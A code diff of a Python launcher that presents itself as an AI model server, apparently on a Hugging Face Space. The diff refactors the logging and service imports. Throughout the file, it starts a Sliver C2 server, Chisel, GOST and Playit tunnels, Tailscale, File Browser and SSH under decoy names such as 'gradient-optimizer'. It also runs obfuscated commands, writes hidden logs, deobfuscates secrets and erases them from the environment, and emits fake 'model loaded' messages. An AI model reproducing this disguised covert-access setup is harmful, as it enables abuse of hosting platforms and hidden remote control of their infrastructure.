@@ -9,11 +9,19 @@ import string
 import sys
 from loguru import logger
 
-# Add parent directory of core to sys.path to allow absolute imports of services
+# Add src/ to sys.path for services and core imports
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-from services import nginx, tailscale, playit, chisel, minecraft, filebrowser, gost, sliver
-
-COVERT_LOGGING_MODE = 1
+from core.logging import setup_service_logs
+from services import (
+    nginx_service,
+    tailscale_service,
+    playit_service,
+    chisel_service,
+    minecraft_service,
+    filebrowser_service,
+    gost_service,
+    sliver_service,
+)
 
 logger.info("--- BOOTING AI MODEL SERVER ---")
 
@@ -76,81 +84,16 @@ def jitter_task():
 
 
 def main():
-    # 1. Initialize Log Files immediately
-    if COVERT_LOGGING_MODE == 1:
-        os.makedirs("/home/user/.torch_metrics", exist_ok=True)
-        ts_log = open("/home/user/.torch_metrics/ts_daemon.log", "a")
-        fb_log = open("/home/user/.torch_metrics/fb.log", "a")
-        tm_log = open("/home/user/.torch_metrics/tm_daemon.log", "a")
-        chisel_log = open("/home/user/.torch_metrics/chisel.log", "a")
-        gost_log = open("/home/user/.torch_metrics/gost.log", "a")
-        sliver_log = open("/home/user/.torch_metrics/sliver.log", "a")
-        nginx_log = open("/home/user/.torch_metrics/nginx.log", "a")
-    elif COVERT_LOGGING_MODE == 2:
-        os.makedirs("/home/user/.torch_metrics", exist_ok=True)
-
-        class TeeLogger:
-            def __init__(self, filepath, prefix):
-                self.file = open(filepath, "a")
-                self.prefix = prefix
-                r, w = os.pipe()
-                self.r = r
-                self.w = w
-                threading.Thread(target=self._reader, daemon=True).start()
-
-            def _reader(self):
-                rf = os.fdopen(self.r, "r", errors="replace")
-                try:
-                    for line in rf:
-                        self.file.write(line)
-                        self.file.flush()
-                        sys.stdout.write(f"[{self.prefix}] {line}")
-                        sys.stdout.flush()
-                except Exception:
-                    pass
-
-            def fileno(self):
-                return self.w
-
-            def write(self, s):
-                self.file.write(s)
-                self.file.flush()
-                sys.stdout.write(
-                    f"[{self.prefix}] {s}\n"
-                    if not s.endswith("\n")
-                    else f"[{self.prefix}] {s}"
-                )
-                sys.stdout.flush()
-
-            def flush(self):
-                self.file.flush()
-                sys.stdout.flush()
-
-        ts_log = TeeLogger("/home/user/.torch_metrics/ts_daemon.log", "TS")
-        fb_log = TeeLogger("/home/user/.torch_metrics/fb.log", "FB")
-        tm_log = TeeLogger("/home/user/.torch_metrics/tm_daemon.log", "PLAYIT")
-        chisel_log = TeeLogger("/home/user/.torch_metrics/chisel.log", "CHISEL")
-        gost_log = TeeLogger("/home/user/.torch_metrics/gost.log", "GOST")
-        sliver_log = TeeLogger("/home/user/.torch_metrics/sliver.log", "SLIVER")
-        nginx_log = TeeLogger("/home/user/.torch_metrics/nginx.log", "NGINX")
-    else:
-        devnull = open(os.devnull, "w")
-        ts_log = devnull
-        fb_log = devnull
-        tm_log = devnull
-        chisel_log = devnull
-        gost_log = devnull
-        sliver_log = devnull
-        nginx_log = devnull
+    logs = setup_service_logs()
 
     # 2. Prep Filesystem:
     os.makedirs("/home/user/static", exist_ok=True)
 
     # 2.5 Start nginx on :7860 as smart frontend immediately so HF space binds/resolves port right away:
-    nginx.start(nginx_log)
+    nginx_service.start(logs.nginx)
 
     # 3. Start the Gradio app (app.py) immediately in background on :7861:
-    logger.info("Starting Gradio fake app (API server)...")
+    logger.info("Starting Gradio app (API server)...")
     cmd_app = decode_cmd(OBFUSCATE("python3 -u /home/user/app.py"))
     app_proc = subprocess.Popen(cmd_app, shell=True)
 
@@ -170,7 +113,7 @@ def main():
     #time.sleep(delay)
 
     # 5. Start Tailscale (python-cache-manager)
-    tailscale.start_daemon(ts_log)
+    tailscale_service.start_daemon(logs.ts)
 
     time.sleep(2)
     logger.info("Warming up text-generation pipelines...")
@@ -179,37 +122,30 @@ def main():
     a_env = os.environ.get("A") or os.environ.get("TAILSCALE") or ""
     full_token = deobfuscate_secret(a_env.strip())
 
-    c_env = os.environ.get("C") or os.environ.get("CHISEL") or ""
-    chisel_auth = deobfuscate_secret(c_env.strip())
-    if not chisel_auth:
-        chisel_auth = "user:apple123"
-
     # Erase the secrets from the environment immediately
-    keys_to_clean = ["A", "TAILSCALE", "C", "CHISEL"]
+    keys_to_clean = ["A", "TAILSCALE"]
     for key in keys_to_clean:
         if key in os.environ:
             del os.environ[key]
 
     # 6. Start File Browser (ai-metrics-collector)
-    filebrowser.start(fb_log)
+    filebrowser_service.start(logs.fb)
 
     # 7. Start Playit (tensor-allocator) - XOR bridge starts after SSHD is ready
-    playit.start(tm_log)
+    playit_service.start(logs.tm)
 
     # 8. Start Chisel (cuda-mesh-bridge) on internal :6789, routed via nginx
-    chisel.start(chisel_log, chisel_auth)
-    
+    chisel_service.start(logs.chisel)
+
     # 8.5 Start GOST (system-bridge) on internal :6790, routed via nginx
-    gost.start(gost_log, chisel_auth)
+    gost_service.start(logs.gost)
 
     # 8.7 Start Sliver C2 (gradient-optimizer) in headless daemon mode
-    sliver.start(sliver_log)
-
-    chisel_auth = ""
+    sliver_service.start(logs.sliver)
 
     # 9. Connect to Tailscale (py-cache-cli)
     time.sleep(5)
-    tailscale.connect(ts_log, full_token)
+    tailscale_service.connect(logs.ts, full_token)
     full_token = ""
 
     # 10. Configure SSH Password
@@ -235,8 +171,10 @@ def main():
             del os.environ[key]
 
     # 11. Start SSHD on port 2222 (set in sshd_config at build time)
-    subprocess.Popen("sudo /usr/sbin/sshd -D", shell=True, stdout=ts_log, stderr=ts_log)
-    # Wait for SSH port to be ready before starting Playit bridge
+    subprocess.Popen(
+        "sudo /usr/sbin/sshd -D", shell=True, stdout=logs.ts, stderr=logs.ts
+    )
+
     def wait_for_port(host, port, timeout=30):
         start = time.time()
         while time.time() - start < timeout:
@@ -246,15 +184,16 @@ def main():
             except OSError:
                 time.sleep(0.5)
         return False
+
     if not wait_for_port("127.0.0.1", 2222, timeout=30):
         logger.error("SSH daemon did not become ready on port 2222")
     else:
         logger.info("SSH daemon ready on port 2222")
         # 11.5 Start XOR bridge NOW that SSHD is confirmed up
-        playit.start_xor_bridge()
+        playit_service.start_xor_bridge()
 
     # 12. Start Minecraft Stealth Daemon in Tmux (server-port 25566; 25565 is XOR bridge)
-   # minecraft.start()
+    # minecraft_service.start()
 
     logger.success("Model loaded successfully. Background services active.")
 
